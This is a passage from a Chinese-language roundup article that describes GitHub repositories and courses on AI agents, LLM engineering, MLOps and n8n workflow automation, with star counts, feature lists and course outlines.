<ul>
<li><strong>开放式问题解决</strong>：LLM动态确定任务步骤</li>
<li><strong>多步骤复杂流程</strong>：需要多轮工具调用和信息处理</li>
<li><strong>智能体协作</strong>：多个智能体合作完成复杂任务</li>
</ul>
<h4 data-id="heading-8">教学特色</h4>
<ul>
<li>11个完整章节的渐进式学习</li>
<li>支持多种语言（中文、英文、德语等）</li>
<li>包含视频教程和交互式示例</li>
<li>Discord社区支持和答疑</li>
</ul>
<hr/>
<h2 data-id="heading-9">3、Agents Engineering Mastery - 企业级AI智能体工程实践</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fed-donner%2Fagents" target="_blank" title="https://github.com/ed-donner/agents" ref="nofollow noopener noreferrer">github.com/ed-donner/a…</a></p>
<p><strong>⭐ Stars：</strong>  1.8k+ | <strong>📈 活跃度：</strong>  极高 | <strong>🏷️ 主要语言：</strong>  Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7e9a97d74834d66a317d8e1cc164e2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=sfu9vyN6qKAGtW3AGaeDIURPkT0%3D" alt="" loading="lazy"/></p>
<p>这是一个为期6周的深度AI智能体工程课程，涵盖OpenAI Agents SDK、CrewAI、LangGraph、AutoGen和MCP等主流框架。专注于从原型到生产部署的完整工程化实践。</p>
<h4 data-id="heading-10">核心技术框架</h4>
<ul>
<li><strong>OpenAI Agents SDK</strong>：企业级智能体开发的官方工具</li>
<li><strong>CrewAI</strong>：多智能体协作和团队化工作流</li>
<li><strong>LangGraph</strong>：复杂智能体工作流的图形化编排</li>
<li><strong>AutoGen</strong>：微软的多智能体对话框架</li>
<li><strong>MCP (Model Context Protocol)</strong> ：模型上下文协议集成</li>
</ul>
<h4 data-id="heading-11">工程实践特色</h4>
<ul>
<li><strong>多云提供商支持</strong>：OpenAI、Groq、DeepSeek、Anthropic等多种API集成</li>
<li><strong>本地化部署</strong>：Ollama本地模型运行和GPU优化</li>
<li><strong>生产级架构</strong>：容器化部署、监控和日志管理</li>
<li><strong>成本优化策略</strong>：API使用监控和预算控制</li>
</ul>
<h4 data-id="heading-12">实战项目案例</h4>
<ul>
<li><strong>工程团队协作</strong>：包含设计师、开发者、测试工程师的多智能体团队</li>
<li><strong>金融分析师</strong>：股票数据分析和投资建议生成</li>
<li><strong>深度研究智能体</strong>：多阶段研究流程自动化</li>
<li><strong>项目规划助手</strong>：需求分析到技术实现的完整项目管理</li>
</ul>
<h4 data-id="heading-13">技术架构亮点</h4>
<ul>
<li><strong>分布式智能体运行时</strong>：支持SingleThreaded和分布式部署</li>
<li><strong>工具集成生态</strong>：文件管理、网络搜索、数据库操作等丰富工具</li>
<li><strong>多模态支持</strong>：文本、图像、音频的综合处理能力</li>
<li><strong>人机协作模式</strong>：Human-in-the-Loop工作流设计</li>
</ul>
<hr/>
<h2 data-id="heading-14">4、Awesome AI Applications - AI应用开发宝典</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FArindam200%2Fawesome-ai-apps" target="_blank" title="https://github.com/Arindam200/awesome-ai-apps" ref="nofollow noopener noreferrer">github.com/Arindam200/…</a></p>
<p><strong>⭐ Stars：</strong>  2.5k+ | <strong>📈 活跃度：</strong>  极高 | <strong>🏷️ 主要语言：</strong>  Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56722d9e4dd640b7943ffd8002ebdeab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=jpqTHxdb3quUiEWTwBgzDbAeZHw%3D" alt="" loading="lazy"/></p>
<p>一个全面的AI应用程序集合，涵盖从简单聊天机器人到复杂企业级智能体的完整开发教程。由Nebius AI Studio支持，提供100多个实用的AI应用示例。</p>
<h4 data-id="heading-15">项目分类体系</h4>
<h5 data-id="heading-16">🧩 入门级智能体</h5>
<ul>
<li><strong>Agno HackerNews分析器</strong>：基于Agno框架的科技新闻趋势分析</li>
<li><strong>OpenAI SDK助手</strong>：邮件处理和俳句创作智能体</li>
<li><strong>LlamaIndex任务管理器</strong>：任务调度和项目管理助手</li>
<li><strong>CrewAI研究团队</strong>：多智能体协作研究系统</li>
</ul>
<h5 data-id="heading-17">🪶 实用型智能体</h5>
<ul>
<li><strong>金融数据智能体</strong>：实时股票数据追踪和市场分析</li>
<li><strong>人机协作智能体</strong>：安全任务执行的HITL模式</li>
<li><strong>新闻通讯生成器</strong>：基于Firecrawl的AI新闻编辑器</li>
<li><strong>日历调度助手</strong>：与Cal.com集成的智能日程管理</li>
</ul>
<h5 data-id="heading-18">🔬 高级智能体系统</h5>
<ul>
<li><strong>深度研究智能体</strong>：多阶段研究工作流，集成Agno和Scrapegraph AI</li>
<li><strong>候选人分析器</strong>：GitHub和LinkedIn档案的智能化评估</li>
<li><strong>职位搜索智能体</strong>：基于Bright Data的LinkedIn职位匹配</li>
<li><strong>AI趋势分析器</strong>：使用Google ADK的趋势挖掘系统</li>
</ul>
<h4 data-id="heading-19">技术生态集成</h4>
<ul>
<li><strong>AI框架支持</strong>：Google ADK、OpenAI Agents SDK、LangChain、LlamaIndex等</li>
<li><strong>企业服务集成</strong>：Nebius AI Studio、Bright Data、Cal.com等</li>
<li><strong>多模态能力</strong>：文本生成、图像创作、数据可视化</li>
<li><strong>云原生架构</strong>：Docker容器化、API服务化部署</li>
</ul>
<h4 data-id="heading-20">工程化特色</h4>
<ul>
<li><strong>一键部署脚本</strong>：uvscript快速环境搭建</li>
<li><strong>详细文档支持</strong>：每个项目都有完整的README和使用说明</li>
<li><strong>视频教程配套</strong>：YouTube教程播放列表支持</li>
<li><strong>社区驱动开发</strong>：持续更新和社区贡献</li>
</ul>
<hr/>
<h2 data-id="heading-21">5、Made With ML - 生产级机器学习系统工程</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FGokuMohandas%2FMade-With-ML" target="_blank" title="https://github.com/GokuMohandas/Made-With-ML" ref="nofollow noopener noreferrer">github.com/GokuMohanda…</a></p>
<p><strong>⭐ Stars：</strong>  16.7k+ | <strong>📈 活跃度：</strong>  高 | <strong>🏷️ 主要语言：</strong>  Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/015264ffbffb4ccea01d3cfb246f5e75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=%2BngVK%2Fj8yPNN4zZbIarHZen7dWY%3D" alt="" loading="lazy"/></p>
<p>GitHub上顶级ML代码仓库之一，致力于教授如何设计、开发、部署和迭代生产级ML应用程序。40K+开发者参与学习，结合机器学习与软件工程最佳实践的综合平台。</p>
<h4 data-id="heading-22">核心工程架构</h4>
<h5 data-id="heading-23">🚀 完整MLOps工作流</h5>
<ul>
<li><strong>分布式训练框架</strong>：基于Ray的可扩展机器学习工作负载</li>
<li><strong>实验跟踪系统</strong>：MLflow集成的模型版本管理和性能监控</li>
<li><strong>自动化调优</strong>：超参数优化和模型选择自动化</li>
<li><strong>CI/CD集成</strong>：GitHub Actions驱动的持续集成和部署流水线</li>
</ul>
<h5 data-id="heading-24">🏗️ 生产级系统设计</h5>
<ul>
<li><strong>微服务架构</strong>：RESTful API和容器化模型服务</li>
<li><strong>在线推理优化</strong>：低延迟预测服务和批量处理支持</li>
<li><strong>监控与告警</strong>：实时性能监控和数据漂移检测</li>
<li><strong>A/B测试框架</strong>：模型效果评估和渐进式部署</li>
</ul>
<h4 data-id="heading-25">技术栈与工具链</h4>
<h5 data-id="heading-26">🔧 核心技术组件</h5>
<ul>
<li><strong>Ray生态系统</strong>：分布式计算、并行训练和超参数调优</li>
<li><strong>深度学习框架</strong>：PyTorch模型开发和微调</li>
<li><strong>特征工程</strong>：预处理管道和特征存储</li>
<li><strong>模型评估</strong>：多指标评估和基准测试</li>
</ul>
<h5 data-id="heading-27">📊 LLM基准测试</h5>
<ul>
<li><strong>零样本学习评估</strong>：GPT-3.5、GPT-4在监督学习任务上的性能对比</li>
<li><strong>少样本学习优化</strong>：上下文学习策略和提示工程</li>
<li><strong>开源模型对比</strong>：Falcon 40B、Llama 2等开源LLM性能分析</li>
<li><strong>微调vs提示学习</strong>：不同学习策略的成本效益分析</li>
</ul>
<h4 data-id="heading-28">实践应用价值</h4>
<h5 data-id="heading-29">💼 企业级部署</h5>
<ul>
<li><strong>可扩展基础设施</strong>：Anyscale云平台集成和本地部署支持</li>
<li><strong>成本优化策略</strong>：计算资源管理和自动伸缩</li>
<li><strong>安全合规</strong>：数据隐私保护和模型安全部署</li>
<li><strong>团队协作</strong>：多角色协作和权限管理</li>
</ul>
<h5 data-id="heading-30">🎯 学习路径设计</h5>
<ul>
<li><strong>理论与实践结合</strong>：从原理到生产的完整学习路径</li>
<li><strong>渐进式复杂度</strong>：从简单分类到复杂NLP任务</li>
<li><strong>工业标准流程</strong>：符合企业级ML开发标准</li>
<li><strong>社区驱动学习</strong>：活跃的技术社区和知识分享</li>
</ul>
<p><strong>最佳应用场景：</strong> 适合希望掌握端到端ML系统开发的工程师、数据科学家和技术团队。特别适用于需要将ML模型从实验阶段快速可靠地推向生产环境的企业项目。</p>
<hr/>
<h2 data-id="heading-31">6、Designing Machine Learning Systems - ML系统设计权威指南</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchiphuyen%2Fdmls-book" target="_blank" title="https://github.com/chiphuyen/dmls-book" ref="nofollow noopener noreferrer">github.com/chiphuyen/d…</a></p>
<p><strong>⭐ Stars：</strong>  8.6k+ | <strong>📈 活跃度：</strong>  稳定更新 | <strong>🏷️ 主要语言：</strong>  Markdown/Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/654c7ce0b8534e29a193a5434abdea21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=PJP05%2Bmlzxk4uyL3qvFRgV9MBXo%3D" alt="" loading="lazy"/></p>
<p>Chip Huyen所著《Designing Machine Learning Systems》的官方配套资源库，提供机器学习系统设计的系统性方法论。该书已被翻译成西班牙语、日语、韩语、波兰语和泰语等多种语言，是ML系统设计领域的权威参考。</p>
<h4 data-id="heading-32">核心设计理念</h4>
<h5 data-id="heading-33">🏛️ 系统设计四大支柱</h5>
<ul>
<li><strong>可靠性</strong>：容错机制、故障恢复和服务可用性保证</li>
<li><strong>可扩展性</strong>：水平扩展、负载均衡和分布式架构设计</li>
<li><strong>可维护性</strong>：模块化设计、代码质量和技术债务管理</li>
<li><strong>适应性</strong>：数据分布变化适应和业务需求演进支持</li>
</ul>
<h5 data-id="heading-34">📚 全生命周期覆盖</h5>
<ul>
<li><strong>第1-2章</strong>：ML系统概述和设计原则</li>
<li><strong>第3-5章</strong>：数据工程基础、训练数据和特征工程</li>
<li><strong>第6-7章</strong>：模型开发、评估和部署服务</li>
<li><strong>第8-9章</strong>：数据分布漂移、监控和持续学习</li>
<li><strong>第10-11章</strong>：MLOps基础设施和人文考量</li>
</ul>
<h4 data-id="heading-35">技术深度解析</h4>
<h5 data-id="heading-36">🔄 数据工程基础</h5>
<ul>
<li><strong>存储模式选择</strong>：行式vs列式存储，文本vs二进制格式对比</li>
<li><strong>数据模型设计</strong>：关系型、文档型、图形数据库的适用场景</li>
<li><strong>流式处理架构</strong>：实时数据处理和批处理系统集成</li>
<li><strong>数据质量保证</strong>：数据验证、清洗和血缘关系追踪</li>
</ul>
<h5 data-id="heading-37">🧠 模型开发与评估</h5>
<ul>
<li><strong>算法选择策略</strong>：基于约束条件的模型选择框架</li>
<li><strong>分布式训练</strong>：数据并行、模型并行和流水线并行技术</li>
<li><strong>模型集成方法</strong>：Bagging、Boosting和Stacking策略</li>
<li><strong>评估指标体系</strong>：业务指标vs技术指标的权衡</li>
</ul>
<h5 data-id="heading-38">🚀 部署与监控</h5>
<ul>
<li><strong>部署模式对比</strong>：在线预测vs批量预测，云端vs边缘部署</li>
<li><strong>推理优化</strong>：模型压缩、量化和硬件加速</li>
<li><strong>监控体系</strong>：运维指标、ML特定指标和性能监控</li>
<li><strong>数据漂移检测</strong>：协变量漂移、标签漂移和概念漂移</li>
</ul>
<h4 data-id="heading-39">资源生态系统</h4>
<h5 data-id="heading-40">📖 学习资源</h5>
<ul>
<li><strong>章节总结</strong>：每章核心概念和关键要点梳理</li>
<li><strong>MLOps工具清单</strong>：开源工具分类和选型指南</li>
<li><strong>扩展阅读</strong>：相关论文、博客和技术资源推荐</li>
<li><strong>基础概念回顾</strong>：ML基础概念的快速参考指南</li>
</ul>
<h5 data-id="heading-41">🛠️ 实践工具</h5>
<ul>
<li><strong>工具分类体系</strong>：数据工程、模型开发、部署监控工具</li>
<li><strong>开源方案对比</strong>：各类MLOps工具的功能特性分析</li>
<li><strong>企业级选型</strong>：Build vs Buy决策框架</li>
<li><strong>技术栈集成</strong>：工具链整合和最佳实践</li>
</ul>
<h4 data-id="heading-42">产业影响价值</h4>
<h5 data-id="heading-43">🎯 目标受众</h5>
<ul>
<li><strong>ML工程师</strong>：系统设计能力提升和最佳实践学习</li>
<li><strong>数据科学家</strong>：从实验到生产的完整技能栈</li>
<li><strong>技术领导者</strong>：ML项目决策和团队建设指导</li>
<li><strong>产品经理</strong>：ML产品规划和技术理解</li>
</ul>
<h5 data-id="heading-44">🌟 独特价值</h5>
<ul>
<li><strong>第一性原理</strong>：深入理解ML系统设计的底层逻辑</li>
<li><strong>工程实践导向</strong>：软件工程最佳实践在ML领域的应用</li>
<li><strong>全局视角</strong>：端到端系统思维而非单点算法优化</li>
<li><strong>负责任AI</strong>：伦理考量和公平性设计的系统性方法</li>
</ul>
<p><strong>最佳应用场景：</strong> 适合构建中大型ML系统的技术团队，特别是需要处理复杂业务需求、高并发场景和企业级部署要求的项目。是ML系统架构师和技术领导者的必备参考。</p>
<ul>
<li>模型服务和推理引擎</li>
<li>监控和告警系统</li>
</ul>
<hr/>
<h2 data-id="heading-45">7、LLMs from Scratch - 从零构建大语言模型</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frasbt%2FLLMs-from-scratch" target="_blank" title="https://github.com/rasbt/LLMs-from-scratch" ref="nofollow noopener noreferrer">github.com/rasbt/LLMs-…</a></p>
<p><strong>⭐ Stars：</strong>  21.5k+ | <strong>📈 活跃度：</strong>  极高 | <strong>🏷️ 主要语言：</strong>  Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1035ab6aa066496b8206d2d856456201~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=7PayGUvVu8RBRv6db1yLDLaEBiM%3D" alt="" loading="lazy"/></p>
<p>Sebastian Raschka所著《Build a Large Language Model (From Scratch)》的官方代码仓库，通过从头编写代码的方式深入理解大语言模型的工作原理。该项目提供了完整的LLM开发、预训练和微调流程，是学习LLM内部机制的权威教程。</p>
<h4 data-id="heading-46">核心技术架构</h4>
<h5 data-id="heading-47">🧠 Transformer核心实现</h5>
<ul>
<li><strong>注意力机制</strong>：多头自注意力、位置编码和掩码机制的完整实现</li>
<li><strong>前馈网络</strong>：GELU激活函数和层归一化优化</li>
<li><strong>模型架构</strong>：完整GPT架构实现，支持124M到更大规模配置</li>
<li><strong>文本生成</strong>：采样策略、温度控制和top-k过滤技术</li>
</ul>
<h5 data-id="heading-48">⚡ 高性能训练优化</h5>
<ul>
<li><strong>分布式训练</strong>：支持多GPU并行训练和梯度累积</li>
<li><strong>内存优化</strong>：KV缓存、梯度检查点和混合精度训练</li>
<li><strong>训练加速</strong>：优化的数据加载器和批处理策略</li>
<li><strong>性能监控</strong>：tokens/sec指标和GPU内存使用追踪</li>
</ul>
<h4 data-id="heading-49">完整学习路径</h4>
<h5 data-id="heading-50">📚 分章节构建体系</h5>
<ul>
<li><strong>第1-2章</strong>：数据处理和分词器实现（GPTDatasetV1、create_dataloader_v1）</li>
<li><strong>第3章</strong>：注意力机制和多头注意力（MultiHeadAttention）</li>
<li><strong>第4章</strong>：GPT模型架构和文本生成（GPTModel、generate_text_simple）</li>
<li><strong>第5章</strong>：预训练流程和优化策略（train_model_simple）</li>
<li><strong>第6章</strong>：分类任务微调和LoRA技术（LinearWithLoRA）</li>
<li><strong>第7章</strong>：指令跟随微调和模型评估（InstructionDataset）</li>
</ul>
<h5 data-id="heading-51">🔬 高级技术特性</h5>
<ul>
<li><strong>LoRA微调</strong>：参数高效的模型适配技术，显著减少训练参数</li>
<li><strong>指令微调</strong>：对话和任务执行能力训练的完整流程</li>
<li><strong>模型评估</strong>：多维度性能评估和基准测试框架</li>
<li><strong>Llama3集成</strong>：现代LLM架构的实现和KV缓存优化</li>
</ul>
<h4 data-id="heading-52">工程实践亮点</h4>
<h5 data-id="heading-53">🛠️ 开发工具链</h5>
<ul>
<li><strong>模块化设计</strong>：可复用的组件库（ch02-ch07模块）和完整测试框架</li>
<li><strong>配置管理</strong>：灵活的模型配置和超参数设置（GPT_CONFIG_124M）</li>
<li><strong>实验追踪</strong>：损失曲线和训练指标可视化</li>
<li><strong>代码质量</strong>：完整的单元测试和Apache 2.0许可证</li>
</ul>
<h5 data-id="heading-54">📊 性能基准</h5>
<ul>
<li><strong>GPT-124M配置</strong>：完整的小规模模型训练（768维嵌入，12层，12头）</li>
<li><strong>训练效率</strong>：优化的训练速度和资源利用率监控</li>
<li><strong>模型质量</strong>：可比肩商业模型的生成质量</li>
<li><strong>硬件适配</strong>：笔记本到服务器环境的完整兼容性</li>
</ul>
<h4 data-id="heading-55">教育价值与应用</h4>
<h5 data-id="heading-56">🎓 学习资源生态</h5>
<ul>
<li><strong>配套课程</strong>：17小时视频教程深度讲解每章内容</li>
<li><strong>实践项目</strong>：从基础到高级的渐进式项目体系</li>
<li><strong>社区支持</strong>：活跃的GitHub Discussions和问题解答</li>
<li><strong>工具推荐</strong>：axolotl、LitGPT等生产级工具链集成</li>
</ul>
<h5 data-id="heading-57">💡 技术深度</h5>
<ul>
<li><strong>算法原理</strong>：深入理解Transformer架构的数学原理</li>
<li><strong>实现细节</strong>：每行代码的详细解释和设计思路</li>
<li><strong>最佳实践</strong>：业界标准的模型开发流程和优化策略</li>
<li><strong>前沿技术</strong>：最新LLM技术的实现和实际应用</li>
</ul>
<p><strong>最佳应用场景：</strong> 适合希望深度理解LLM工作原理的开发者、研究人员和AI从业者。特别适用于需要定制化LLM解决方案的团队，以及希望在AI领域建立扎实技术基础的学习者。</p>
<hr/>
<h2 data-id="heading-58">8、 LLM Engineering - 大型语言模型工程实践</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fed-donner%2Fllm" target="_blank" title="https://github.com/ed-donner/llm" ref="nofollow noopener noreferrer">github.com/ed-donner/l…</a>_engineering</p>
<p><strong>⭐ Stars：</strong>  2.3k+ | <strong>📈 活跃度：</strong>  极高 | <strong>🏷️ 主要语言：</strong>  Jupyter Notebook</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae83fc7a0e1840ceadbbd04533fc9000~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=bwwXDeTf19BZ9DjbipzMFMBDO0M%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-59">项目概述</h4>
<p>Edward Donner开发的8周LLM工程师训练营，面向工程实践的大语言模型开发指南。涵盖从开发环境配置到部署的完整工程化流程，注重实战技能培养和最佳实践传授。</p>
<h4 data-id="heading-60">完整课程体系</h4>
<h5 data-id="heading-61">📚 8周渐进式学习路径</h5>
<ul>
<li><strong>第1周</strong>：LLM基础和Ollama本地部署（Llama 3.2）</li>
<li><strong>第2周</strong>：API集成和多模型对比（OpenAI、Anthropic、Google）</li>
<li><strong>第3周</strong>：Google Colab GPU训练和向量数据库</li>
<li><strong>第4-5周</strong>：RAG系统构建和知识检索优化</li>
<li><strong>第6-7周</strong>：模型微调和Weights &amp; Biases监控</li>
<li><strong>第8周</strong>：自主AI智能体解决方案</li>
</ul>
<h5 data-id="heading-62">🛠️ 工程实践重点</h5>
<ul>
<li><strong>环境配置</strong>：跨平台开发环境搭建（Windows、Mac、Linux）</li>
<li><strong>API成本管理</strong>：多厂商API使用和成本优化策略</li>
<li><strong>数据工程</strong>：大规模文本数据处理和质量控制</li>
<li><strong>生产部署</strong>：从原型到生产的完整部署流程</li>
</ul>
<h4 data-id="heading-63">技术栈与工具</h4>
<h5 data-id="heading-64">🔧 核心开发工具</h5>
<ul>
<li><strong>Anaconda环境</strong>：隔离的Python开发环境和依赖管理</li>
<li><strong>Jupyter Lab</strong>：交互式开发和数据科学工作流</li>
<li><strong>Google Colab</strong>：云端GPU训练和协作开发</li>
<li><strong>Ollama本地部署</strong>：本地LLM运行和测试环境</li>
</ul>
<h5 data-id="heading-65">🌐 多模型API集成</h5>
<ul>
<li><strong>OpenAI集成</strong>：GPT-4o、GPT-4o-mini的API调用和优化</li>
<li><strong>Anthropic Claude</strong>：Claude-3模型家族的使用和对比</li>
<li><strong>Google Gemini</strong>：Gemini API的集成和应用</li>
<li><strong>DeepSeek API</strong>：新兴模型的测试和评估</li>
</ul>
<h4 data-id="heading-66">实践项目与应用</h4>
<h5 data-id="heading-67">📋 渐进式项目构建</h5>
<ul>
<li><strong>会议纪要生成器</strong>：音频转录和智能总结</li>
<li><strong>RAG知识问答系统</strong>：文档检索和智能回答</li>
<li><strong>多智能体对话系统</strong>：智能体协作和角色扮演</li>
<li><strong>自主AI助手</strong>：端到端的智能体解决方案</li>
</ul>
<h5 data-id="heading-68">💡 工程化特色</h5>
<ul>
<li><strong>错误处理和调试</strong>：完整的troubleshooting指南</li>
<li><strong>成本监控</strong>：API使用量监控和成本控制</li>
<li><strong>环境兼容性</strong>：跨平台部署和环境一致性</li>
<li><strong>社区贡献</strong>：Pull Request流程和代码分享</li>
</ul>
<h4 data-id="heading-69">学习价值与职业发展</h4>
<h5 data-id="heading-70">🎯 技能提升维度</h5>
<ul>
<li><strong>数据工程师</strong>：LLM集成和数据管道优化</li>
<li><strong>软件工程师</strong>：AI能力集成和产品开发</li>
<li><strong>产品经理</strong>：AI产品规划和技术理解</li>
<li><strong>研究人员</strong>：快速原型开发和实验验证</li>
</ul>
<h5 data-id="heading-71">📈 职业发展路径</h5>
<ul>
<li><strong>AI开发岗位</strong>：自然语言处理和内容生成</li>
<li><strong>工程效率提升</strong>：自动化文档、邮件和报告生成</li>
<li><strong>决策支持系统</strong>：大数据洞察和智能分析</li>
<li><strong>创新产品开发</strong>：AI驱动的新产品和服务</li>
</ul>
<h4 data-id="heading-72">实战导向特色</h4>
<h5 data-id="heading-73">🚀 项目实施方法</h5>
<ul>
<li><strong>边学边做</strong>：每周实战项目和挑战任务</li>
<li><strong>代码分享</strong>：GitHub Pull Request和社区贡献</li>
<li><strong>成本控制</strong>：免费替代方案和预算管理</li>
<li><strong>持续学习</strong>：资源链接和扩展阅读</li>
</ul>
<h5 data-id="heading-74">🔬 技术深度</h5>
<ul>
<li><strong>伦理考量</strong>：AI偏见识别和公平性设计</li>
<li><strong>性能优化</strong>：推理延迟和吞吐量优化</li>
<li><strong>扩展性设计</strong>：从原型到企业级部署</li>
<li><strong>监控运维</strong>：生产环境监控和故障排除</li>
</ul>
<p><strong>最佳应用场景：</strong> 适合希望快速掌握LLM工程实践的开发者和技术团队。特别适用于需要将LLM技术快速集成到现有产品的企业，以及希望建立AI技术栈的初创公司。</p>
<h2 data-id="heading-75">9.  N8N Workflows Collection - 高性能工作流文档系统</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FZie619%2Fn8n-workflows" target="_blank" title="https://github.com/Zie619/n8n-workflows" ref="nofollow noopener noreferrer">github.com/Zie619/n8n-…</a></p>
<p><strong>⭐ Stars：</strong>  约100+ | <strong>📈 活跃度：</strong>  高 | <strong>🏷️ 主要语言：</strong>  Python/JavaScript</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccedd61b13bb490b946f77279b947de5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=SEr6r0QtqpmD%2BKnOWATCVm%2Bb9es%3D" alt="" loading="lazy"/></p>
<p>N8N工作流集合，收录2,053个专业工作流，覆盖365种服务集成，配备高性能文档系统。基于先进的SQLite FTS5全文检索技术，响应时间&lt;100ms，为工作流自动化提供企业级的发现和管理平台。</p>
<h4 data-id="heading-76">🚀 核心功能特性</h4>
<h5 data-id="heading-77">📊 收录规模</h5>
<ul>
<li><strong>工作流总数</strong>：2,053个专业分类工作流</li>
<li><strong>节点总数</strong>：29,445个（平均每个工作流14.3个节点）</li>
<li><strong>服务集成</strong>：365种独特服务和API集成</li>
<li><strong>触发类型</strong>：Webhook、定时、手动、复杂触发系统</li>
</ul>
<h5 data-id="heading-78">⚡ 高性能技术架构</h5>
<ul>
<li><strong>SQLite + FTS5全文检索</strong>：sub-100ms响应时间，比传统系统快700倍</li>
<li><strong>智能分类系统</strong>：12个服务类别自动识别（消息、AI/ML、数据库等）</li>
<li><strong>响应式界面</strong>：完美支持移动端，深色/浅色主题切换</li>
<li><strong>RESTful API</strong>：完整API支持工作流搜索、下载、图表生成</li>
</ul>
<h4 data-id="heading-79">🔍 智能搜索与分类</h4>
<h5 data-id="heading-80">📂 服务类别覆盖</h5>
<ul>
<li><strong>消息通信</strong>：Telegram、Discord、Slack、WhatsApp、Teams</li>
<li><strong>AI/ML集成</strong>：OpenAI、Anthropic、Hugging Face AI服务</li>
<li><strong>数据库连接</strong>：PostgreSQL、MySQL、MongoDB、Redis、Airtable</li>
<li><strong>云存储管理</strong>：Google Drive、Dropbox、OneDrive文件同步</li>
<li><strong>项目管理</strong>：Jira、GitHub、GitLab、Trello、Asana协作</li>
</ul>
<h5 data-id="heading-81">🎯 复杂度分析</h5>
<ul>
<li><strong>低复杂度(≤5节点)</strong> ：35% - 简单自动化任务</li>
<li><strong>中等复杂度(6-15节点)</strong> ：45% - 标准业务流程</li>
<li><strong>高复杂度(16+节点)</strong> ：20% - 企业级系统集成</li>
</ul>
<h4 data-id="heading-82">💡 技术创新亮点</h4>
<h5 data-id="heading-83">🛠️ 智能命名系统</h5>
<pre><code class="hljs language-bash" lang="bash"> 
<span class="hljs-comment"># 自动转换技术文件名为可读标题</span>
​
前：2051_Telegram_Webhook_Automation_Webhook.json
​
后：Telegram Webhook Automation
</code></pre>
<h5 data-id="heading-84">📱 现代化界面特性</h5>
<ul>
<li><strong>实时统计仪表板</strong>：工作流活跃度和使用统计</li>
<li><strong>Mermaid图表生成</strong>：可视化工作流程图</li>
<li><strong>即时搜索</strong>：键入即搜索，防抖优化</li>
<li><strong>筛选器组合</strong>：触发类型、复杂度、服务类别多维筛选</li>
</ul>
<h4 data-id="heading-85">🏗️ 企业级特性</h4>
<h5 data-id="heading-86">🔐 部署与管理</h5>
<ul>
<li><strong>多环境支持</strong>：Python/Node.js双技术栈实现</li>
<li><strong>Docker容器化</strong>：一键部署和扩展</li>
<li><strong>API文档</strong>：OpenAPI标准，自动文档生成</li>
<li><strong>变更检测</strong>：MD5哈希算法，高效重建索引</li>
</ul>
<h5 data-id="heading-87">📈 性能指标</h5>
<ul>
<li><strong>数据库大小</strong>：&lt;50MB（比传统HTML系统小700倍）</li>
<li><strong>内存占用</strong>：&lt;50MB RAM（比旧系统少40倍）</li>
<li><strong>加载时间</strong>：&lt;1秒（比传统系统快10倍）</li>
<li><strong>搜索响应</strong>：即时FTS5全文检索</li>
</ul>
<hr/>
<h2 data-id="heading-88">10、Build AI Agents with N8N - LinkedIn Learning企业级课程</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FLinkedInLearning%2Fbuild-ai-agents-and-automate-workflows-with-n8n-5437042" target="_blank" title="https://github.com/LinkedInLearning/build-ai-agents-and-automate-workflows-with-n8n-5437042" ref="nofollow noopener noreferrer">github.com/LinkedInLea…</a></p>
<p><strong>⭐ Stars：</strong>  新项目 | <strong>📈 活跃度：</strong>  官方维护 | <strong>🏷️ 主要语言：</strong>  JSON配置</p>
